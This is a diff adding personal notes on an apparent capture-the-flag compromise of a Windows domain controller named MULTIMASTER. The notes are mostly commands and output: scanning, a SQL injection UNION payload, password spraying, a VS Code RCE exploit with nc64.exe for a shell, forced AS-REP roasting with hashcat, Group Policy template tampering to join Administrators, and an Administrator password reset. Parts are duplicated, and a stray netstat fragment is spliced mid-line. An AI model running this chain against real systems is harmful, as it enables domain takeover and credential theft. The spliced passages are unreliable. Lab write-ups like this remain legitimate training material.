@@ -16,6 +16,264 @@ Cracking the AS_REP $23
 
 Priv Esc:
     Via BloodHound We find that we have the right to add user spn via the account
+    set it to PRE-Auth and get the users Hash for the password ASREP / kerberos $23 Hashcat -m 18200
+    We use the Backup priv of the user to modify the GPT Template -  SeBackupPrivilege /  SeRestorePrivilege
+    We modify GPT Template to escalade to Administrator
+    We Modify the Admin Passwd
+##################
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.179  -oN enum/scan.log -vv
+        PORT     STATE SERVICE       REASON  VERSION
+        53/tcp   open  domain        syn-ack Simple DNS Plus
+        80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+        |_http-server-header: Microsoft-IIS/10.0
+        |_http-title: MegaCorp
+        | http-methods: 
+        |   Supported Methods: GET HEAD OPTIONS TRACE
+        |_  Potentially risky methods: TRACE
+        |_http-favicon: Unknown favicon MD5: 6944F7C42798BE78E1465F1C49B5BF04
+        88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-03-21 17:55:21Z)
+        135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+        139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+        389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+        445/tcp  open  microsoft-ds  syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+        464/tcp  open  kpasswd5?     syn-ack
+        593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+        636/tcp  open  tcpwrapped    syn-ack
+        3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+        3269/tcp open  tcpwrapped    syn-ack
+        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+
+    
+    SMB Enum:
+        ─$ crackmapexec smb 10.10.10.179 -u "" -p ''
+            SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+            SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\: 
+
+    
+    LDAP Enum:
+        Error was NT_STATUS_ACCESS_DENIED  
+
+
+    RPC - Anonymous:
+    └─$ rpcclient -U "" -N 10.10.10.179
+        rpcclient $> enumdomusers
+        result was NT_STATUS_ACCESS_DENIED
+
+    Port 80:
+        https://www.youtube.com/watch?v=ChRYyQtv5bc
+            We found a list users in 'collegue research'
+            We make a bad query on the research bar via burpsuite
+            We use the unicode escape '%27' with sqlmap
+
+            Sqlmap was able to dump DB Table with Hased password
+            we got 3 passwds
+
+    Attack SQL Server via BurpSuite - Repeater:
+        https://www.youtube.com/watch?v=ChRYyQtv5bc
+        https://dencode.com/en/string/unicode-escape
+        https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/
+        -
+        https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+        to get the SID via SQL func:
+            unicode escape - to return in plain text:
+                ' UNION ALL SELECT 70,(SELECT master.dbo.vfn_varbintohexstr(SUSER_ID('MEGACORP\Domain Admins'))),70,70,70-- CJcx"
+
+                SID:
+                    0x0105000000000005150000001c00d1bc181f1492bdfc23600020000
+
+
+        We found new users, we test crackmapexec password spray and we found a successful auth
+            crackmapexec smb 10.10.10.179 -u users.txt  -p passwords.txt:
+                [+] MEGACORP.LOCAL\tush****:**** 
+
+        
+        We also perform enum4linux with the creds:
+        ─$ enum4linux -a -u "tus*****" -p '****' 10.10.10.179  
+
+
+    Connect to the machine:
+        Find other users in order to POPULATE our users list:
+            *Evil-WinRM* PS C:\Users\alcibiades\Desktop> net user
+
+        We check the process:
+            *Evil-WinRM* PS C:\Users\alcibiades\Desktop> Get-Process
+                Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+                -------  ------    -----      -----     ------     --  -- -----------
+                    403      53    96088     132692              2008   1 Code
+                    278      51    58276      74124              2116   1 Code
+      
+        We found VSCode Process runing
+
+        We found a CVE with Visual Studio Code:
+            2019-1414 - RCE
+            https://iwantmore.pizza/posts/cve-2019-1414.html
+            *Evil-WinRM* PS C:\Users\sbauer\Desktop> Set-ADUser -Identity jorden -ServicePrincipalNames @{Add='HTTP/webserver', 'HTTP/SomeAlias'}
+.0.0.0:0              LISTENING       InHost
+                    TCP    127.0.0.1:28477        0.0.0.0:0              LISTENING       InHost
+                    TCP    127.0.0.1:35677        0.0.0.0:0              LISTENING       InHost
+                    TCP    127.0.0.1:55495        0.0.0.0:0              LISTENING       InHost
+
+
+                *Evil-WinRM* PS C:\Users\alcibiades\Desktop> netstat -ano | findstr "LISTENING" | findstr "127" | findstr "0.0"
+                    TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2452
+                    TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       3900
+                    TCP    127.0.0.1:48242        0.0.0.0:0              LISTENING       1660
+                    TCP    127.0.0.1:62190        0.0.0.0:0              LISTENING       3280
+
+            We follow the documentation and the youtube video, we install Nodejs and the depedencies, we modify the scrypt in the doc + we upload them in the machine in zip and w add NC64.exe
+
+            we get a shell with an other account and we found an API file that contains a password in clear text 
+
+
+            We passwordspray and we find goodcreds
+            $ crackmapexec smb 10.10.10.179 -u users.txt  -p passwords.txt
+                SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\s**:*** 
+
+
+
+2-Exploit - Priv Escalation - AD:
+
+
+        We use BloodHound:
+            We find that we have the right to add user spn via the account:
+                *Evil-WinRM* PS C:\Users\s***\Desktop> Set-ADUser -Identity jorden -ServicePrincipalNames @{Add='HTTP/webserver', 'HTTP/SomeAlias'}
+
+
+        Get the added SPNs:
+            python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 megacorp.local/s****:***! -request:
+                ServicePrincipalName  Name    MemberOf                                      PasswordLastSet             LastLogon  Delegation 
+                --------------------  ------  --------------------------------------------  --------------------------  ---------  ----------
+                HTTP/SomeAlias        jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 19:48:17.503303  <never>               
+                HTTP/webserver        jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 19:48:17.503303  <never>   
+
+
+        We will set it to PRE-Auth and use GetNPUsers to dump the Hash:
+            *Evil-WinRM* PS C:\Users\s***\Desktop> Get-ADUser -Identity jorden | Set-ADAccountControl -doesnotrequirepreauth $true
+
+            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.100 megacorp.local/s****:***! -request
+
+            Cracking the AS_REP $23
+
+            └─$ hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
+
+        We got a shell with 'jorden':
+            ─$ evil-winrm -i 10.10.10.179 -u jorden  -p ***
+
+
+        
+    *Evil-WinRM* PS C:\Users\jorden\Desktop> whoami /all
+
+        USER INFORMATION
+        ----------------
+
+        User Name       SID
+        =============== =============================================
+        megacorp\jorden S-1-5-21-3167813660-1240564177-918740779-3110
+
+
+        GROUP INFORMATION
+        -----------------
+
+        Group Name                                 Type             SID                                           Attributes
+        ========================================== ================ ============================================= ==================================================
+        Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+        BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+
+
+        PRIVILEGES INFORMATION
+        ----------------------
+
+        Privilege Name                Description                         State
+        ============================= =================================== =======
+        SeMachineAccountPrivilege     Add workstations to domain          Enabled
+        SeSystemtimePrivilege         Change the system time              Enabled
+        SeBackupPrivilege             Back up files and directories       Enabled <------ WE will change the Policies of the backup and then restore it with privilege
+        SeRestorePrivilege            Restore files and directories       Enabled <------
+        SeShutdownPrivilege           Shut down the system                Enabled
+        SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+        SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+        SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+        SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+        *Evil-WinRM* PS C:\Windows\sysvol\sysvol\MEGACORP.LOCAL\Policies>
+
+        *Evil-WinRM* PS C:\Windows\sysvol\sysvol\MEGACORP.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\microsoft\windows nt\secedit> download GptTmpl.inf
+
+        Kali:
+            At the end of the GPT Policy we add jorden SID in the Admin:
+                [Group Membership]
+                *S-1-5-32-544__Members = *S-1-5-21-3167813660-1240564177-918740779-3110
+
+
+        We Then Delete the Policy:
+            *Evil-WinRM* PS C:\Windows\sysvol\sysvol\MEGACORP.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\microsoft\windows nt\secedit> delete C.inf
+
+        We upload Our Modified Policy:
+            *Evil-WinRM* PS C:\users\jorden\Downloads> upload GptTmpl.inf
+
+        We move to the right path:
+            *Evil-WinRM* PS C:\users\jorden\Downloads> move GptTmpl.inf C:\Windows\sysvol\sysvol\MEGACORP.LOCAL\Policies\'{6AC1786C-016F-11D2-945F-00C04fB984F9}'\Machine\microsoft\'windows nt'\secedit
+
+        We force the update of the policy:
+            *Evil-WinRM* PS C:\Windows\sysvol\sysvol\MEGACORP.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\microsoft\windows nt\secedit> gpupdate /force
+
+
+    We reconnect via evil-winRm:
+        *Evil-WinRM* PS C:\Users\jorden\Documents> whoami /all
+
+            USER INFORMATION
+            ----------------
+
+            User Name       SID
+            =============== =============================================
+            megacorp\jorden S-1-5-21-3167813660-1240564177-918740779-3110
+
+
+            GROUP INFORMATION
+            -----------------
+
+            Group Name                                 Type             SID                                         
+            ========================================== ================ =============
+            Everyone                                   Well-known group S-1-1-0                                                
+            BUILTIN\Administrators                     Alias            S-1-5-32-544 <--- WE ARE NOW MEMBER OF ADMINS
+
+
+    We Modify the Admin Passwd:
+        *Evil-WinRM* PS C:\Users\jorden\Documents> net user Administrator adib7575!
+
+
+    We connect as Admin:
+        ─$ evil-winrm -i 10.10.10.179 -u administrator  -p adib7575!    
+        *Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+
+
+
+                        
+
+
+
+
+        
+
+
+
+Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. 
+By exploiting debug functionality, a shell as the user `cyork` can be gained. 
+A password is found in a DLL, which due to password reuse, results in a shell as `sbauer`. 
+This user is found to have `GenericWrite` permissions on the user `jorden`. 
+Abusing this privilege allows us to gain access to the server as this user. 
+`jorden` is be member of `Server Operators` group, whose privileges we exploit to get a SYSTEM shell.
+
+Attack SQL Server
+Visual Studio Code RCE - https://iwantmore.pizza/posts/cve-2019-1414.html - via NodeJs
+Cracking the AS_REP $23
+└─$ hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
+
+Priv Esc:
+    Via BloodHound We find that we have the right to add user spn via the account
     We use the Backup priv of the user to modify the GPT Template -  SeBackupPrivilege /  SeRestorePrivilege
     We modify GPT Template to escalade to Administrator
     We Modify the Admin Passwd
@@ -265,5 +523,6 @@ Priv Esc:
 
 
         
+
 
 
